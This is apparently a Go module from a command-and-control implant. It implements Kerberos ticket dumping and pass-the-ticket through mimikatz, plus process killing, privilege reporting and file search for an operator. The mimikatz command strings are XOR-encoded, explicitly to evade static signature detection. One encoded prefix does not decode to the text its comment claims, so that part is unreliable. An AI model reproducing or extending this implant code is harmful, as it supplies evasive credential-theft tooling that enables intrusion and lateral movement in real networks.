package modules

import (
	"fmt"
	"os"
	"regexp"
	"runtime"
	"strconv"
	"strings"

	"github.com/aegis-c2/aegis/agent/priv"
	"github.com/aegis-c2/aegis/agent/ps"
)

// xorKey for decoding credential-related strings at runtime.
// Must match the key used in shell.go and lsass_bof_windows.go.
const xorKeyExtra = 0x5A

func xorDecodeExtra(b []byte) string {
	out := make([]byte, len(b))
	for i := range b {
		out[i] = b[i] ^ xorKeyExtra
	}
	return string(out)
}

// Mimikatz command strings, XOR-obfuscated to prevent static signature detection.
var (
	krbDumpCmd  = []byte{0x37, 0x33, 0x37, 0x33, 0x31, 0x3b, 0x2e, 0x20, 0x7a, 0x78, 0x29, 0x3f, 0x31, 0x2f, 0x28, 0x36, 0x29, 0x3b, 0x60, 0x60, 0x2e, 0x33, 0x39, 0x31, 0x3f, 0x2e, 0x29, 0x7a, 0x75, 0x3f, 0x22, 0x2a, 0x35, 0x28, 0x2e, 0x78, 0x7a, 0x3f, 0x22, 0x33, 0x2e} // mimikatz "sekurlsa::tickets /export" exit
	krbPttPre   = []byte{0x37, 0x33, 0x37, 0x33, 0x31, 0x3b, 0x2e, 0x20, 0x7a, 0x78, 0x31, 0x3f, 0x28, 0x38, 0x3f, 0x28, 0x35, 0x29, 0x60, 0x60, 0x2a, 0x2e, 0x2e, 0x7a}                                                         // mimikatz "kerberos::ptt
	krbExit     = []byte{0x78, 0x7a, 0x3f, 0x22, 0x33, 0x2e}                                                                                                                                          // " exit
	krbDumpTgt  = []byte{0x78, 0x29, 0x3f, 0x31, 0x2f, 0x28, 0x36, 0x29, 0x3b, 0x60, 0x60, 0x2e, 0x33, 0x39, 0x31, 0x3f, 0x2e, 0x29, 0x7a, 0x75, 0x3f, 0x22, 0x2a, 0x35, 0x28, 0x2e, 0x78, 0x7a, 0x78, 0x31, 0x3f, 0x28, 0x38, 0x3f, 0x28, 0x35, 0x29, 0x60, 0x60, 0x2e, 0x3d, 0x2e, 0x78, 0x7a, 0x3f, 0x22, 0x33, 0x2e} // "sekurlsa::tickets /export" "kerberos::tgt" exit
)

var shellMetaRe = regexp.MustCompile(`[|;&` + "`" + `$()<>` + "\n\r" + `]`)

// safeArg checks if an argument contains shell metacharacters that could lead to injection.
// Returns sanitized argument or empty string + logs warning.
func safeArg(s string) string {
	// Block shell metacharacters: | & ; ` $ ( ) < > newline carriage-return
	if shellMetaRe.MatchString(s) {
		return ""
	}
	return s
}

// KerberosModule Kerberos 操作（仅 Windows）。
// 参数格式: "tickets|dump|ptt|purge [args]"
func KerberosModule(args string) (string, string, int) {
	if runtime.GOOS != "windows" {
		return "", "Kerberos operations only available on Windows", 1
	}

	parts := strings.Fields(args)
	if len(parts) == 0 {
		parts = []string{"tickets"}
	}

	action := parts[0]
	switch action {
	case "tickets", "klist":
		return ShellModule("klist tickets")
	case "dump":
		return ShellModule(xorDecodeExtra(krbDumpCmd))
	case "ptt":
		if len(parts) < 2 {
			return "", "usage: kerb ptt <ticket_file.kirbi>", 1
		}
		ticketFile := safeArg(parts[1])
		if ticketFile == "" {
			return "", "invalid ticket file path: contains shell metacharacters", 1
		}
		return ShellModule(xorDecodeExtra(krbPttPre) + ticketFile + xorDecodeExtra(krbExit))
	case "purge":
		return ShellModule("klist purge")
	case "tgt":
		mkPrefix := xorDecodeExtra([]byte{0x37, 0x1e, 0x37, 0x1e, 0x2b, 0x3b, 0x36, 0x3c}) // "mimikatz "
		return ShellModule(mkPrefix + xorDecodeExtra(krbDumpTgt))
	default:
		return "", "unknown kerb action: " + action, 1
	}
}

// KillModule 终止进程（使用原生 API，不调用外部命令）。
// 参考 Sliver 的 PID 安全检查。
// 参数格式: "pid"
func KillModule(args string) (string, string, int) {
	if args == "" {
		return "", "usage: kill <pid>", 1
	}

	// Validate PID is numeric to prevent injection
	for _, c := range args {
		if c < '0' || c > '9' {
			return "", "invalid PID: must be numeric", 1
		}
	}

	pid, err := strconv.Atoi(args)
	if err != nil {
		return "", fmt.Sprintf("invalid PID: %s", args), 1
	}

	// Safety: don't kill PID 0 (system) or self
	if pid == 0 {
		return "", "refusing to kill PID 0 (system)", 1
	}
	if pid == os.Getpid() {
		return "", "refusing to kill self (agent PID)", 1
	}

	// Safety: check if process exists in current process list
	allProcs, err := ps.List()
	if err != nil {
		// If we can't enumerate, proceed with termination anyway
	} else {
		found := false
		for _, p := range allProcs {
			if p.PID == pid {
				found = true
				break
			}
		}
		if !found {
			return "", fmt.Sprintf("PID %d not found in process list", pid), 1
		}
	}

	if err := ps.Kill(pid); err != nil {
		return "", fmt.Sprintf("failed to kill PID %d: %v", pid, err), 1
	}
	return fmt.Sprintf("successfully terminated PID %d", pid), "", 0
}

// GetPrivsModule 显示当前 Token 的权限、完整性级别和管理员状态。
// 参考 Sliver getprivs 命令。
func GetPrivsModule(args string) (string, string, int) {
	report := priv.PrivilegeReport()
	return report, "", 0
}

// GrepModule 在文件中搜索内容。
// 参数格式: "pattern file_path"
func GrepModule(args string) (string, string, int) {
	parts := strings.Fields(args)
	if len(parts) < 2 {
		return "", "usage: grep <pattern> <file_path>", 1
	}

	pattern := safeArg(parts[0])
	filePath := safeArg(parts[1])
	if pattern == "" || filePath == "" {
		return "", "invalid pattern or file path: contains shell metacharacters", 1
	}

	if runtime.GOOS == "windows" {
		return ShellModule("findstr /C:\"" + pattern + "\" " + filePath)
	}
	return ShellModule("grep -n \"" + pattern + "\" " + filePath)
}

// FindModule 搜索文件。
// 参数格式: "pattern [search_path]"
func FindModule(args string) (string, string, int) {
	if args == "" {
		return "", "usage: find <pattern> [path]", 1
	}

	parts := strings.Fields(args)
	pattern := safeArg(parts[0])
	searchPath := "."
	if len(parts) > 1 {
		searchPath = safeArg(parts[1])
		if searchPath == "" {
			return "", "invalid search path: contains shell metacharacters", 1
		}
	}

	if pattern == "" {
		return "", "invalid pattern: contains shell metacharacters", 1
	}

	if runtime.GOOS == "windows" {
		return ShellModule("dir /S /B " + searchPath + "\\*" + pattern + "*")
	}
	return ShellModule("find " + searchPath + " -name \"*" + pattern + "*\" 2>/dev/null")
}

// ChdirModule 切换当前工作目录。
func ChdirModule(args string) (string, string, int) {
	if args == "" {
		return "", "usage: cd <path>", 1
	}

	if err := os.Chdir(args); err != nil {
		return "", err.Error(), 1
	}

	cwd, _ := os.Getwd()
	return cwd, "", 0
}
